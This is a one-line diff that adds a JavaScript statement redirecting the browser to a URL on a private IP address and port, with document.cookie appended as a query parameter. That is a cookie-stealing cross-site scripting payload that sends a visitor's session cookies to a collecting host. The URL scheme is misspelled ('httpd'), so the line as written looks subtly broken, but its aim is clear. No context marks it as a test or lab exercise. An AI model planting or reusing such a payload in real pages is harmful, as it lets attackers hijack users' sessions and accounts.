@@ -1,0 +1,1 @@
+location.href="httpd://192.168.0.151:1234/?cookie="+document.cookie
